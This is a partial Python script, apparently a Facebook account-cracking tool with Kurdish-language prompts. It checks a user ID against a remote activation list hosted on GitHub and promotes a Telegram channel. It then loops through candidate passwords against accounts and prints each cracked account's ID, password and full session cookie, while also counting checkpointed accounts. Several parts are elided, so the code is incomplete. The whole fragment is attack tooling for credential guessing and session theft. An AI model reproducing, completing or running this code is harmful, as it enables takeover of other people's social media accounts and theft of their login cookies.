...
os.system('TEAM_CRACKERS -u > list.txt')
uid = open('list.txt', 'r')
for j in uid:
    sp = j.split()
def I():
    ...
    if id in requests.get("https://raw.githubusercontent.com/0ZANYAR/AZAD/main/kurd.txt").text:
        print("\033[92m YOUR ID IS ACTIVE .....")
        time.sleep(1)
        pass
    else:
        print("\033[91m BO ACTIVE KRDNE IDYAKAT NAMA BNERA @LN_YASHEX")
        os.system('xdg-open https://t.me/LN_YASHEX')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[OK YASHEX😵]=  ' +cid+ ' | ' +ps+    '  \n \033[1;97mCOOKES = \033[1;97m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r               %s[%s/%s]  [OK YASHEX👌:%s]  [CP BLACK:%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
